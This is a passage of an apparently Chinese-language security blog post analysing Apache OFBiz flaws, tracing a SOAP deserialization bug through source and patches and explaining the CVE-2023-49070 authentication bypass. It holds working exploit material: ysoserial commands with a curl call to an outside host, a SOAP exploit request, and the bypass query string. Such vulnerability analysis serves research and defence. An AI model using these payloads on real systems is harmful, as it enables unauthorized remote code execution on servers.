class="line">  <span class="tag">&lt;<span class="name">security</span> <span class="attr">https</span>=<span class="string">&quot;false&quot;</span>/&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">event</span> <span class="attr">type</span>=<span class="string">&quot;soap&quot;</span>/&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">response</span> <span class="attr">name</span>=<span class="string">&quot;error&quot;</span> <span class="attr">type</span>=<span class="string">&quot;none&quot;</span>/&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">response</span> <span class="attr">name</span>=<span class="string">&quot;success&quot;</span> <span class="attr">type</span>=<span class="string">&quot;none&quot;</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">request-map</span>&gt;</span></span><br></pre></td></tr></table></figure><p><font style="color:#000000;">可以看到，SOAPService路由对应的event为soap，寻找对应的SOAP Event Handler。在org.apache.ofbiz.webapp.event.SOAPEventHandler#invoke方法中，会利用SoapSerializer#deserialize方法，将SOAP请求中的XML数据反序列化为Java对象。</font></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> String <span class="title function_">invoke</span><span class="params">(Event event, RequestMap requestMap, HttpServletRequest request, HttpServletResponse response)</span> <span class="keyword">throws</span> EventHandlerException &#123;</span><br><span class="line">    ...</span><br><span class="line">    <span class="type">String</span> <span class="variable">serviceName</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="type">SOAPBody</span> <span class="variable">reqBody</span> <span class="operator">=</span> reqEnv.getBody();</span><br><span class="line">        validateSOAPBody(reqBody);</span><br><span class="line">        <span class="type">OMElement</span> <span class="variable">serviceElement</span> <span class="operator">=</span> reqBody.getFirstElement();</span><br><span class="line">        serviceName = serviceElement.getLocalName();</span><br><span class="line">        Map&lt;String, Object&gt; parameters = UtilGenerics.cast(SoapSerializer.deserialize(serviceElement.toString(), delegator));</span><br><span class="line">        ...</span><br><span class="line">    &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">        sendError(response, e.getMessage(), serviceName);</span><br><span class="line">        Debug.logError(e, <span class="keyword">module</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><font style="color:#000000;">在org.apache.ofbiz.service.engine.SoapSerializer#deserialize方法中，会利用XmlSerializer#deserialize方法来将XML数据反序列化为Java对象。</font></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title function_">deserialize</span><span class="params">(String content, Delegator delegator)</span> <span class="keyword">throws</span> SerializeException, SAXException, ParserConfigurationException, IOException &#123;</span><br><span class="line">    <span class="type">Document</span> <span class="variable">document</span> <span class="operator">=</span> UtilXml.readXmlDocument(content, <span class="literal">false</span>);</span><br><span class="line">    <span class="keyword">if</span> (document != <span class="literal">null</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> XmlSerializer.deserialize(document, delegator);</span><br><span class="line">    &#125;</span><br><span class="line">    Debug.logWarning(<span class="string">&quot;Serialized document came back null&quot;</span>, <span class="keyword">module</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><font style="color:#000000;">在org.apache.ofbiz.entity.serialize.XmlSerializer#deserialize方法中，调用org.apache.ofbiz.entity.serialize.XmlSerializer#deserializeSingle方法，根据标签进行解析，接着进一步调用org.apache.ofbiz.entity.serialize.XmlSerializer#</font><font style="color:#000000;background-color:#ffffff;">deserializeCustom</font><font style="color:#000000;">方法。</font></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title function_">deserialize</span><span class="params">(Document document, Delegator delegator)</span> <span class="keyword">throws</span> SerializeException &#123;</span><br><span class="line">    <span class="type">Element</span> <span class="variable">rootElement</span> <span class="operator">=</span> document.getDocumentElement();</span><br><span class="line">    <span class="comment">// find the first element below the root element, that should be the object</span></span><br><span class="line">    <span class="type">Node</span> <span class="variable">curChild</span> <span class="operator">=</span> rootElement.getFirstChild();</span><br><span class="line">    <span class="keyword">while</span> (curChild != <span class="literal">null</span> &amp;&amp; curChild.getNodeType() != Node.ELEMENT_NODE) &#123;</span><br><span class="line">        curChild = curChild.getNextSibling();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (curChild == <span class="literal">null</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> deserializeSingle((Element) curChild, delegator);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title function_">deserializeSingle</span><span class="params">(Element element, Delegator delegator)</span> <span class="keyword">throws</span> SerializeException &#123;</span><br><span class="line">    <span class="type">String</span> <span class="variable">tagName</span> <span class="operator">=</span> element.getLocalName();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="string">&quot;null&quot;</span>.equals(tagName)) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    ...</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> deserializeCustom(element);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title function_">deserializeCustom</span><span class="params">(Element element)</span> <span class="keyword">throws</span> SerializeException &#123;</span><br><span class="line">    <span class="type">String</span> <span class="variable">tagName</span> <span class="operator">=</span> element.getLocalName();</span><br><span class="line">    <span class="keyword">if</span> (<span class="string">&quot;cus-obj&quot;</span>.equals(tagName)) &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">value</span> <span class="operator">=</span> UtilXml.elementValue(element);</span><br><span class="line">        <span class="keyword">if</span> (value != <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="type">byte</span>[] valueBytes = StringUtil.fromHexString(value);</span><br><span class="line">            <span class="keyword">if</span> (valueBytes != <span class="literal">null</span>) &#123;</span><br><span class="line">                <span class="type">Object</span> <span class="variable">obj</span> <span class="operator">=</span> UtilObject.getObject(valueBytes);</span><br><span class="line">                <span class="keyword">if</span> (obj != <span class="literal">null</span>) &#123;</span><br><span class="line">                    <span class="keyword">return</span> obj;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">SerializeException</span>(<span class="string">&quot;Problem deserializing object from byte array + &quot;</span> + element.getLocalName());</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">SerializeException</span>(<span class="string">&quot;Cannot deserialize element named &quot;</span> + element.getLocalName());</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在<font style="color:#000000;">XmlSerializer#</font><font style="color:#000000;background-color:#ffffff;">deserializeCustom</font><font style="color:#000000;">方法中，当标签为cus-obj时，对内容进行一次十六进制解码处理，然后调用org.apache.ofbiz.base.util.UtilObject#getObject方法将字节数组反序列化为Java对象。UtilObject#getObject方法进一步调用UtilObject#getObjectException方法来反序列化字节数组数据，但是这里调用的是自定义的SafeObjectInputStream来处理数据。</font></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title function_">getObject</span><span class="params">(<span class="type">byte</span>[] bytes)</span> &#123;</span><br><span class="line">    <span class="type">Object</span> <span class="variable">obj</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        obj = getObjectException(bytes);</span><br><span class="line">    &#125; <span class="keyword">catch</span> (ClassNotFoundException | IOException e) &#123;</span><br><span class="line">        Debug.logError(e, <span class="keyword">module</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> obj;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title function_">getObjectException</span><span class="params">(<span class="type">byte</span>[] bytes)</span> <span class="keyword">throws</span> ClassNotFoundException, IOException &#123;</span><br><span class="line">    <span class="keyword">try</span> (<span class="type">ByteArrayInputStream</span> <span class="variable">bis</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayInputStream</span>(bytes);</span><br><span class="line">            <span class="type">SafeObjectInputStream</span> <span class="variable">wois</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">SafeObjectInputStream</span>(bis)) &#123;</span><br><span class="line">        <span class="keyword">return</span> wois.readObject();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><font style="color:#000000;">跟进SafeObjectInputStream，可以看到采用了白名单来限制了反序列化的类，由于java..*的松散程度过大，导致了恶意反序列化的发生。</font></p><p><img src="/2024/12/18/Cursory-Analysis-Of-Apache-OFBiz/1734423006307-ef7649a9-4ed2-4507-83d7-8268c694fca9.png"></p><p><font style="color:#000000;">在官方补丁</font><a href="https://github.com/apache/ofbiz-framework/commit/af9ed4e">https://github.com/apache/ofbiz-framework/commit/af9ed4e</a><font style="color:#000000;">也可以看到，增加了对</font><font style="color:#000000;background-color:#ffffff;">java.rmi.server的反序列化限制。</font></p><p><img src="/2024/12/18/Cursory-Analysis-Of-Apache-OFBiz/1734423244554-ec57d8c5-7cb8-4885-9119-174aae0b1400.png"></p><p>漏洞利用数据包如下：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">java -<span class="built_in">cp</span> ysoserial-all.jar ysoserial.exploit.JRMPListener 1099 CommonsBeanutils1 <span class="string">&quot;curl http://192.168.0.115:4444&quot;</span></span><br><span class="line">java -jar ysoserial-all.jar JRMPClient <span class="string">&quot;192.168.0.115:1099&quot;</span> | xxd -p -c 10000000</span><br></pre></td></tr></table></figure><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/webtools/control/SOAPService</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>127.0.0.1:8443</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>close</span><br><span class="line"><span class="attribute">Cache-Control</span><span class="punctuation">: </span>max-age=0</span><br><span class="line"><span class="attribute">Upgrade-Insecure-Requests</span><span class="punctuation">: </span>1</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36</span><br><span class="line"><span class="attribute">Sec-Fetch-Dest</span><span class="punctuation">: </span>document</span><br><span class="line"><span class="attribute">Accept</span><span class="punctuation">: </span>text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9</span><br><span class="line"><span class="attribute">Sec-Fetch-Site</span><span class="punctuation">: </span>none</span><br><span class="line"><span class="attribute">Sec-Fetch-Mode</span><span class="punctuation">: </span>navigate</span><br><span class="line"><span class="attribute">Sec-Fetch-User</span><span class="punctuation">: </span>?1</span><br><span class="line"><span class="attribute">Accept-Language</span><span class="punctuation">: </span>zh-CN,zh;q=0.9</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>767</span><br><span class="line"></span><br><span class="line"><span class="language-handlebars"><span class="language-xml"><span class="tag">&lt;<span class="name">soapenv:Envelope</span> <span class="attr">xmlns:soapenv</span>=<span class="string">&quot;http://schemas.xmlsoap.org/soap/envelope/&quot;</span>&gt;</span><span class="tag">&lt;<span class="name">soapenv:Header</span>/&gt;</span></span></span></span><br><span class="line"><span class="language-xml"><span class="language-handlebars">    <span class="tag">&lt;<span class="name">soapenv:Body</span>&gt;</span></span></span></span><br><span class="line"><span class="language-xml"><span class="language-handlebars">        <span class="tag">&lt;<span class="name">ser</span>&gt;</span></span></span></span><br><span class="line"><span class="language-xml"><span class="language-handlebars">            <span class="tag">&lt;<span class="name">cus-obj</span>&gt;</span></span><span class="template-variable">&#123;&#123;<span class="name">payload</span>&#125;&#125;</span><span class="language-xml"><span class="tag">&lt;/<span class="name">cus-obj</span>&gt;</span></span></span></span><br><span class="line"><span class="language-xml"><span class="language-handlebars">        <span class="tag">&lt;/<span class="name">ser</span>&gt;</span></span></span></span><br><span class="line"><span class="language-xml"><span class="language-handlebars">    <span class="tag">&lt;/<span class="name">soapenv:Body</span>&gt;</span></span></span></span><br><span class="line"><span class="language-xml"><span class="language-handlebars"><span class="tag">&lt;/<span class="name">soapenv:Envelope</span>&gt;</span></span></span></span><br></pre></td></tr></table></figure><p><font style="color:#000000;">官方补丁中采用黑名单的方式增加对java.rmi.server的限制，</font><a href="https://github.com/apache/ofbiz-framework/commit/af9ed4e#diff-c0e9a4bd325bc9530a752224575a9f3942e7cba19d61001836214c50d56aa9fcR72">https://github.com/apache/ofbiz-framework/commit/af9ed4e#diff-c0e9a4bd325bc9530a752224575a9f3942e7cba19d61001836214c50d56aa9fcR72</a>。</p><p><font style="color:#000000;">由于这种修复方式依旧没有解决白名单绕过的问题，r00t4dm师傅利用javax.management.remote.rmi.RMIConnectionImpl_Stub绕过了该补丁（CVE-2021-29200），参考</font><a href="https://xz.aliyun.com/t/9556?time__1311=n4+xnD0DuAeWqxYq40HpDUrOWDkC1DBBiKbrYD">Apache OFBiz CVE-2021-29200 简要分析</a><font style="color:#000000;">。</font></p><h2 id="Bypas-Auth"><a href="#Bypas-Auth" class="headerlink" title="Bypas Auth"></a><font style="color:#000000;">Bypas Auth</font></h2><h3 id="CVE-2023-49070"><a href="#CVE-2023-49070" class="headerlink" title="CVE-2023-49070"></a>CVE-2023-49070</h3><p><font style="color:#000000;">上文提到了，对于XMLRPC相关的漏洞增加了两个主要的修复方式，那如果想让漏洞重新变为一个Pre-Auth RCE漏洞，需要满足如下条件：</font></p><ol><li><strong><font style="color:#000000;">绕过对于&lt;&#x2F;serializable这个关键词的检测</font></strong></li><li><strong><font style="color:#000000;">绕过对XML-RPC这个接口的认证</font></strong></li></ol><p><font style="color:#000000;">上文已经知道了补丁的信息，增加了一个CacheFilter来进行防护，可以看到首先会匹配当前uri是否为&#x2F;control&#x2F;xmlrpc，如果路由符合的话会判断请求体中是否包含&lt;&#x2F;serializable关键词，匹配到了则进行拦截。</font></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">doFilter</span><span class="params">(ServletRequest request, ServletResponse response, FilterChain chain)</span> <span class="keyword">throws</span> IOException, ServletException &#123;</span><br><span class="line">    <span class="comment">// Get the request URI without the webapp mount point.</span></span><br><span class="line">    <span class="type">String</span> <span class="variable">context</span> <span class="operator">=</span> ((HttpServletRequest) request).getContextPath();</span><br><span class="line">    <span class="type">String</span> <span class="variable">uriWithContext</span> <span class="operator">=</span> ((HttpServletRequest) request).getRequestURI();</span><br><span class="line">    <span class="type">String</span> <span class="variable">uri</span> <span class="operator">=</span> uriWithContext.substring(context.length());</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="string">&quot;/control/xmlrpc&quot;</span>.equals(uri.toLowerCase())) &#123;</span><br><span class="line">        <span class="comment">// Read request.getReader() as many time you need</span></span><br><span class="line">        request = <span class="keyword">new</span> <span class="title class_">RequestWrapper</span>((HttpServletRequest) request);</span><br><span class="line">        <span class="type">String</span> <span class="variable">body</span> <span class="operator">=</span> request.getReader().lines().collect(Collectors.joining());</span><br><span class="line">        <span class="keyword">if</span> (body.contains(<span class="string">&quot;&lt;/serializable&quot;</span>)) &#123;</span><br><span class="line">            Debug.logError(<span class="string">&quot;Content not authorised for security reason&quot;</span>, <span class="string">&quot;CacheFilter&quot;</span>); <span class="comment">// Cf. OFBIZ-12332</span></span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    chain.doFilter(request, response);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><font style="color:#000000;">在Java中，部分中间件如Tomcat可以通过;的方式，在路径中增加Matrix Parameters来进行绕过，</font><a href="https://www.baeldung.com/cs/url-matrix-vs-query-parameters">https://www.baeldung.com/cs/url-matrix-vs-query-parameters</a>。<font style="color:#000000;">尝试在XML-RPC请求的路径中增加分号&#x2F;webtools&#x2F;control&#x2F;xmlrpc;&#x2F;，可以看到此时uri已经变成&#x2F;control&#x2F;xmlrpc;&#x2F;，绕过了这里的限制。</font></p><p><img src="/2024/12/18/Cursory-Analysis-Of-Apache-OFBiz/1734401953859-801c2846-16a4-4402-9fe2-2e81822a8aad.png"></p><p>此时绕过了对于&lt;&#x2F;serializable这个关键词的检测，可以看到服务器返回了登录界面，因此还需要绕过对XML-RPC这个接口的认证。</p><p><img src="/2024/12/18/Cursory-Analysis-Of-Apache-OFBiz/1734402182734-3a2957cb-b5fd-4f1d-88b1-7828e75a6a5f.png"></p><p><font style="color:#000000;">在org.apache.ofbiz.webapp.control.LoginWorker#checkLogin方法下断点，该函数用于检查用户是否登录。注意到一个关键的判断</font><strong><font style="color:#000000;">“username &#x3D;&#x3D; null || (password &#x3D;&#x3D; null &amp;&amp; token &#x3D;&#x3D; null) || “error”.equals(login(request, response)”</font></strong><font style="color:#000000;">，此时当username和password不为null，且login方法的返回值不为error即可绕过。</font></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> String <span class="title function_">checkLogin</span><span class="params">(HttpServletRequest request, HttpServletResponse response)</span> &#123;</span><br><span class="line">    <span class="type">GenericValue</span> <span class="variable">userLogin</span> <span class="operator">=</span> checkLogout(request, response);</span><br><span class="line">    <span class="type">HttpSession</span> <span class="variable">session</span> <span class="operator">=</span> request.getSession();</span><br><span class="line"></span><br><span class="line">    <span class="type">String</span> <span class="variable">username</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">    <span class="type">String</span> <span class="variable">password</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">    <span class="type">String</span> <span class="variable">token</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (userLogin == <span class="literal">null</span>) &#123;</span><br><span class="line">        <span class="comment">// check parameters</span></span><br><span class="line">        username = request.getParameter(<span class="string">&quot;USERNAME&quot;</span>);</span><br><span class="line">        password = request.getParameter(<span class="string">&quot;PASSWORD&quot;</span>);</span><br><span class="line">        token = request.getParameter(<span class="string">&quot;TOKEN&quot;</span>);</span><br><span class="line">        <span class="comment">// check session attributes</span></span><br><span class="line">        <span class="keyword">if</span> (username == <span class="literal">null</span>) username = (String) session.getAttribute(<span class="string">&quot;USERNAME&quot;</span>);</span><br><span class="line">        <span class="keyword">if</span> (password == <span class="literal">null</span>) password = (String) session.getAttribute(<span class="string">&quot;PASSWORD&quot;</span>);</span><br><span class="line">        <span class="keyword">if</span> (token == <span class="literal">null</span>) token = (String) session.getAttribute(<span class="string">&quot;TOKEN&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// in this condition log them in if not already; if not logged in or can&#x27;t log in, save parameters and return error</span></span><br><span class="line">        <span class="keyword">if</span> (username == <span class="literal">null</span></span><br><span class="line">                || (password == <span class="literal">null</span> &amp;&amp; token == <span class="literal">null</span>)</span><br><span class="line">                || <span class="string">&quot;error&quot;</span>.equals(login(request, response))) &#123;</span><br><span class="line">            request.removeAttribute(<span class="string">&quot;_LOGIN_PASSED_&quot;</span>);</span><br><span class="line">            session.setAttribute(<span class="string">&quot;_PREVIOUS_REQUEST_&quot;</span>, request.getPathInfo());</span><br><span class="line">            Map&lt;String, Object&gt; urlParams = UtilHttp.getUrlOnlyParameterMap(request);</span><br><span class="line">            <span class="keyword">if</span> (UtilValidate.isNotEmpty(urlParams)) &#123;</span><br><span class="line">                session.setAttribute(<span class="string">&quot;_PREVIOUS_PARAM_MAP_URL_&quot;</span>, urlParams);</span><br><span class="line">            &#125;</span><br><span class="line">            Map&lt;String, Object&gt; formParams = UtilHttp.getParameterMap(request, urlParams.keySet(), <span class="literal">false</span>);</span><br><span class="line">            <span class="keyword">if</span> (UtilValidate.isNotEmpty(formParams)) &#123;</span><br><span class="line">                session.setAttribute(<span class="string">&quot;_PREVIOUS_PARAM_MAP_FORM_&quot;</span>, formParams);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;error&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//Allow loggingOut when impersonated</span></span><br><span class="line">    <span class="type">boolean</span> <span class="variable">isLoggingOut</span> <span class="operator">=</span> <span class="string">&quot;logout&quot;</span>.equals(RequestHandler.getRequestUri(request.getPathInfo()));</span><br><span class="line">    <span class="comment">//Check if the user has an impersonation in process</span></span><br><span class="line">    <span class="type">boolean</span> <span class="variable">authoriseLoginDuringImpersonate</span> <span class="operator">=</span> EntityUtilProperties.propertyValueEquals(<span class="string">&quot;security&quot;</span>, <span class="string">&quot;security.login.authorised.during.impersonate&quot;</span>, <span class="string">&quot;true&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> (!isLoggingOut &amp;&amp; !authoriseLoginDuringImpersonate &amp;&amp; checkImpersonationInProcess(request, response) != <span class="literal">null</span>) &#123;</span><br><span class="line">        request.removeAttribute(<span class="string">&quot;_ERROR_MESSAGE_LIST_&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;impersonated&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;success&quot;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="/2024/12/18/Cursory-Analysis-Of-Apache-OFBiz/1734402943170-70799cc4-b629-47de-a925-20eba49c0d56.png"></p><p><font style="color:#000000;">跟进org.apache.ofbiz.webapp.control.LoginWorker#login方法，注意到如下几行代码，可以看到当unpwErrMsgList不为空且requirePasswordChange参数值为Y时，返回的结果即为requirePasswordChange而不是error，满足前文绕过需求。而要使得unpwErrMsgList不为，则需要满足username为空或者password和token同时为空，因此可以构造传参为</font><strong><font style="color:#000000;">USERNAME&#x3D;&amp;PASSWORD&#x3D;&amp;token&#x3D;&amp;requirePasswordChange&#x3D;Y</font></strong><font style="color:#000000;">。</font></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">List&lt;String&gt; unpwErrMsgList = <span class="keyword">new</span> <span class="title class_">LinkedList</span>&lt;String&gt;();</span><br><span class="line"><span class="keyword">if</span> (UtilValidate.isEmpty(username)) &#123;</span><br><span class="line">    unpwErrMsgList.add(UtilProperties.getMessage(resourceWebapp, <span class="string">&quot;loginevents.username_was_empty_reenter&quot;</span>, UtilHttp.getLocale(request)));</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (UtilValidate.isEmpty(password) &amp;&amp; UtilValidate.isEmpty(token)) &#123;</span><br><span class="line">    unpwErrMsgList.add(UtilProperties.getMessage(resourceWebapp, <span class="string">&quot;loginevents.password_was_empty_reenter&quot;</span>, UtilHttp.getLocale(request)));</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">boolean</span> <span class="variable">requirePasswordChange</span> <span class="operator">=</span> <span class="string">&quot;Y&quot;</span>.equals(request.getParameter(<span class="string">&quot;requirePasswordChange&quot;</span>));</span><br><span class="line"><span class="keyword">if</span> (!unpwErrMsgList.isEmpty()) &#123;</span><br><span class="line">    request.setAttribute(<span class="string">&quot;_ERROR_MESSAGE_LIST_&quot;</span>, unpwErrMsgList);</span><br><span class="line">    <span class="keyword">return</span>  requirePasswordChange ? <span class="string">&quot;requirePasswordChange&quot;</span> : <span class="string">&quot;error&quot;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>漏洞利用数据包如下：</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/webtools/control/xmlrpc/;/?USERNAME=&amp;PASSWORD=&amp;token=&amp;requirePasswordChange=Y</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>127.0.0.1:8443</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>application/xml</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: 